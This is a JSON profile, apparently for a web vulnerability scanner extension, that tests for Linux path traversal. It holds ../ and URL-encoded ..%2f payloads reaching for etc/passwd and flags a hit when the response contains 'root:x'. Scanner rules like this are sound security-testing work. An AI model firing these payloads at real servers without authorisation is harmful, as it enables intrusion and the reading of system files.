[
  {
    "ProfileName": "Linux-PathTraversal-MR",
    "Name": "",
    "Enabled": true,
    "Scanner": 1,
    "Author": "@egarme",
    "Payloads": [
      "true,/../{FILE}",
      "true,/../../{FILE}",
      "true,/../../../{FILE}",
      "true,/../../../../{FILE}",
      "true,/../../../../../{FILE}",
      "true,/../../../../../../{FILE}",
      "true,/../../../../../../../{FILE}",
      "true,/../../../../../../../../{FILE}",
      "true,/..%2f{FILE}",
      "true,/..%2f..%2f{FILE}",
      "true,/..%2f..%2f..%2f{FILE}",
      "true,/..%2f..%2f..%2f..%2f{FILE}",
      "true,/..%2f..%2f..%2f..%2f..%2f{FILE}",
      "true,/..%2f..%2f..%2f..%2f..%2f..%2f{FILE}",
      "true,/..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE}",
      "true,/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE}"
    ],
    "Encoder": [],
    "UrlEncode": false,
    "CharsToUrlEncode": "",
    "Grep": [
      "true,,root:x"
    ],
    "Tags": [
      "All"
    ],
    "PayloadResponse": false,
    "NotResponse": false,
    "TimeOut1": "",
    "TimeOut2": "",
    "isTime": false,
    "contentLength": "",
    "iscontentLength": false,
    "CaseSensitive": false,
    "ExcludeHTTP": false,
    "OnlyHTTP": false,
    "IsContentType": false,
    "ContentType": "",
    "HttpResponseCode": "",
    "NegativeCT": false,
    "IsResponseCode": false,
    "ResponseCode": "",
    "NegativeRC": false,
    "urlextension": "",
    "isurlextension": false,
    "NegativeUrlExtension": false,
    "MatchType": 1,
    "Scope": 0,
    "RedirType": 0,
    "MaxRedir": 0,
    "payloadPosition": 1,
    "payloadsFile": "",
    "grepsFile": "",
    "IssueName": "Linux-PathTraversal",
    "IssueSeverity": "Medium",
    "IssueConfidence": "Certain",
    "IssueDetail": "Path traversal with payloads: \u003cbr\u003e \u003cpayload\u003e",
    "RemediationDetail": "",
    "IssueBackground": "",
    "RemediationBackground": "",
    "Header": [
      {
        "type": "Payload",
        "match": "{FILE}",
        "replace": "etc/passwd",
        "regex": "String"
      }
    ],
    "VariationAttributes": [],
    "InsertionPointType": [
      65
    ],
    "Scanas": false,
    "Scantype": 0,
    "pathDiscovery": false
  }
]